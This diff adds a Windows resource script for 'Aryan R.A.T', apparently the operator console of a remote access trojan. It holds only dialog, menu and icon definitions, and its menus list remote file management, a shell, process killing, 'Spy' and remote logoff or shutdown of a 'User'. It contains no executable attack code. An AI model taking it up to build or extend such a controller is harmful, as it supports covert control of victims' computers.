@@ -1,0 +1,321 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// French (France) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_FRA)
+#ifdef _WIN32
+LANGUAGE LANG_FRENCH, SUBLANG_FRENCH
+#pragma code_page(1252)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+#endif    // French (France) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+/////////////////////////////////////////////////////////////////////////////
+// English (U.K.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENG)
+#ifdef _WIN32
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_UK
+#pragma code_page(1252)
+#endif //_WIN32
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_DIALOG1 DIALOGEX 0, 0, 563, 206
+STYLE DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_CLIENTEDGE
+CAPTION 
+"Aryan R.A.T                                                                   ..::http://mint-community.org::.."
+
+MENU IDR_MENU2
+FONT 10, "Times New Roman"
+BEGIN
+    CONTROL         "List1",IDC_SERVERLIST,"SysListView32",LVS_REPORT | 
+                    LVS_SHOWSELALWAYS | WS_BORDER | WS_TABSTOP,0,0,563,121,
+                    WS_EX_CLIENTEDGE
+    CONTROL         "List2",IDC_LOGS,"SysListView32",LVS_REPORT | WS_TABSTOP,
+                    0,125,359,71,WS_EX_CLIENTEDGE
+    CONTROL         "List1",IDC_CONNECTIONSTATUS,"SysListView32",LVS_REPORT | 
+                    WS_TABSTOP,362,125,200,71,WS_EX_CLIENTEDGE
+END
+
+IDD_DIALOG3 DIALOGEX 0, 0, 411, 190
+STYLE WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_CLIENTEDGE
+CAPTION "a"
+FONT 8, "MS Sans Serif"
+BEGIN
+    CONTROL         "List1",IDC_TASKLIST,"SysListView32",LVS_REPORT | 
+                    LVS_SINGLESEL | WS_BORDER | WS_TABSTOP,7,20,399,156,
+                    WS_EX_CLIENTEDGE
+    CONTROL         "Tab1",IDC_TAB1,"SysTabControl32",TCS_FORCELABELLEFT | 
+                    TCS_FIXEDWIDTH,2,0,409,182,WS_EX_CLIENTEDGE
+END
+
+IDD_FILE DIALOGEX 0, 0, 431, 281
+STYLE DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
+FONT 10, "Times New Roman"
+BEGIN
+    CONTROL         "Tree1",IDC_TREE1,"SysTreeView32",TVS_HASBUTTONS | 
+                    TVS_HASLINES | TVS_SHOWSELALWAYS | WS_TABSTOP,0,0,92,101,
+                    WS_EX_CLIENTEDGE
+    CONTROL         "List1",IDC_FILELIST,"SysListView32",LVS_REPORT | 
+                    LVS_SORTASCENDING | LVS_EDITLABELS | WS_BORDER | 
+                    WS_TABSTOP,186,0,245,205,WS_EX_CLIENTEDGE
+    CONTROL         "List1",IDC_FOLDERS,"SysListView32",LVS_REPORT | 
+                    LVS_SORTASCENDING | WS_BORDER | WS_TABSTOP,92,0,93,205,
+                    WS_EX_CLIENTEDGE
+    CONTROL         "List1",IDC_DOWNLOADS,"SysListView32",LVS_REPORT | 
+                    WS_TABSTOP,0,206,431,65,WS_EX_CLIENTEDGE
+    CONTROL         "Tree1",IDC_BOOKMARKS,"SysTreeView32",TVS_HASBUTTONS | 
+                    TVS_HASLINES | WS_TABSTOP,0,104,92,101,WS_EX_CLIENTEDGE
+END
+
+IDD_RENAME DIALOGEX 0, 0, 208, 25
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_TOOLWINDOW
+CAPTION "Rename"
+FONT 8, "MS Sans Serif"
+BEGIN
+    LTEXT           "NewName:",IDC_STATIC,7,0,39,8
+    EDITTEXT        IDC_NAME,7,10,165,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "Set",IDC_SETNAME,176,9,32,13
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_DIALOG1, DIALOG
+    BEGIN
+        VERTGUIDE, 5
+        BOTTOMMARGIN, 196
+    END
+
+    IDD_DIALOG3, DIALOG
+    BEGIN
+        VERTGUIDE, 260
+        HORZGUIDE, 182
+    END
+
+    IDD_FILE, DIALOG
+    BEGIN
+        VERTGUIDE, 92
+        BOTTOMMARGIN, 271
+        HORZGUIDE, 205
+    END
+
+    IDD_RENAME, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Menu
+//
+
+IDR_MENU2 MENU DISCARDABLE 
+BEGIN
+    POPUP "File"
+    BEGIN
+        MENUITEM "&Listen",                     IDC_LISTEN
+        MENUITEM "&Stop",                       IDC_DISCONNECT, GRAYED
+        MENUITEM SEPARATOR
+        MENUITEM "&Reset",                      IDC_RESET, GRAYED
+        MENUITEM SEPARATOR
+        MENUITEM "&Exit",                       IDC_EXIT
+    END
+    POPUP "Edit", GRAYED
+    BEGIN
+        MENUITEM "Connection",                  IDC_CONNECTIONOPTIONS
+        MENUITEM SEPARATOR
+        MENUITEM "Server",                      IDC_EDITSERVER
+    END
+    POPUP "Tools"
+    BEGIN
+        POPUP "Admin"
+        BEGIN
+            MENUITEM "File Manager",                IDC_FILEMANAGER
+            MENUITEM "Shell",                       IDC_SHELL, GRAYED
+            MENUITEM "Task Manager",                IDC_TASKMANAGER
+        END
+        MENUITEM "Spy",                         65535, GRAYED
+        MENUITEM "Fun",                         65535, GRAYED
+    END
+END
+
+IDR_MENU1 MENU DISCARDABLE 
+BEGIN
+    POPUP "Manage"
+    BEGIN
+        MENUITEM "Kill",                        IDC_TASK_KILL
+        MENUITEM SEPARATOR
+        MENUITEM "Refresh",                     IDC_REFRESH_TASK
+    END
+END
+
+IDR_MENU3 MENU DISCARDABLE 
+BEGIN
+    POPUP "File"
+    BEGIN
+        MENUITEM "Download",                    IDC_DOWNLOADFILE, GRAYED
+        MENUITEM "Upload",                      IDC_UPLOAD
+        MENUITEM SEPARATOR
+        MENUITEM "Delete File",                 IDC_DELETEFILE
+        MENUITEM "Rename",                      IDC_RENAME
+        MENUITEM "Cut",                         IDC_MOVE
+        MENUITEM "Copy",                        IDC_COPY
+        MENUITEM "Paste",                       IDC_PASTE
+    END
+    MENUITEM "Edit",                        65535
+END
+
+IDR_COMMANDS MENU DISCARDABLE 
+BEGIN
+    POPUP "Tools"
+    BEGIN
+        MENUITEM "File Manager",                IDC_FILEMANAGER
+        MENUITEM "Shell",                       IDC_SHELL
+        MENUITEM "Task manager",                IDC_TASKMANAGER
+        MENUITEM SEPARATOR
+        MENUITEM "Log Off User",                IDC_LOGOFF
+        MENUITEM "Shutdown User",               IDC_SHUTDOWN
+        MENUITEM "Restart User",                IDC_RESTART
+        MENUITEM SEPARATOR
+    END
+END
+
+IDR_MENU4 MENU DISCARDABLE 
+BEGIN
+    POPUP "File"
+    BEGIN
+        MENUITEM "listen",                      IDC_LISTEN
+        MENUITEM SEPARATOR
+        MENUITEM "Settings",                    IDC_CONNECTIONOPTIONS
+        , GRAYED
+        MENUITEM SEPARATOR
+        MENUITEM "Edit Server",                 IDC_EDITSERVER, GRAYED
+    END
+END
+
+IDR_MENUFolder MENU DISCARDABLE 
+BEGIN
+    POPUP "File"
+    BEGIN
+        MENUITEM "Open",                        IDC_ENTERDIR
+        MENUITEM "Back",                        IDC_BACK
+        MENUITEM "New",                         IDC_NEW_FOLDER
+        MENUITEM "Rename",                      IDC_RENAME_FOLDER
+        MENUITEM "BookMark",                    IDC_BOOKMARK
+    END
+END
+
+IDR_MENUBOOK MENU DISCARDABLE 
+BEGIN
+    POPUP "Book"
+    BEGIN
+        MENUITEM "Open",                        IDC_GOTO
+        MENUITEM SEPARATOR
+        MENUITEM "Add BookMark",                IDC_ADDBOOKMARK
+    END
+END
+
+IDR_DOWNLOAD MENU DISCARDABLE 
+BEGIN
+    POPUP "Downloads"
+    BEGIN
+        MENUITEM "Reset",                       IDC_RESET
+    END
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDI_BOOKMARKRED         ICON    DISCARDABLE     "resource\\red.ico"
+IDI_BOOKMARKBLUE        ICON    DISCARDABLE     "resource\\blue.ico"
+IDI_BOOKMARK            ICON    DISCARDABLE     "resource\\goldLeaf.ICO"
+IDI_BOOKMARKPURPLE      ICON    DISCARDABLE     "resource\\purple.ico"
+IDI_FILE                ICON    DISCARDABLE     "resource\\Default Document_ico_3.ico"
+IDI_TEXT                ICON    DISCARDABLE     "resource\\21_ico_1.ico"
+IDI_MEDIA               ICON    DISCARDABLE     "resource\\Media Clip_ico_1.ico"
+IDI_EXE                 ICON    DISCARDABLE     "resource\\progman_exe_Ico22_ico_Ico1.ico"
+IDI_FOLDER              ICON    DISCARDABLE     "resource\\folder.ico"
+IDI_FLOPPY              ICON    DISCARDABLE     "resource\\drive_disk.ico"
+IDI_CD                  ICON    DISCARDABLE     "resource\\drive_cd.ico"
+IDI_STATIC              ICON    DISCARDABLE     "resource\\Hard Drive_ico_5.ico"
+IDI_NETWORK             ICON    DISCARDABLE     "resource\\drive_network.ico"
+IDI_PICTURE             ICON    DISCARDABLE     "resource\\image.ico"
+IDI_VIDEO               ICON    DISCARDABLE     "resource\\film.ico"
+IDI_COMPRESSED          ICON    DISCARDABLE     "resource\\icon2.ico"
+#endif    // English (U.K.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
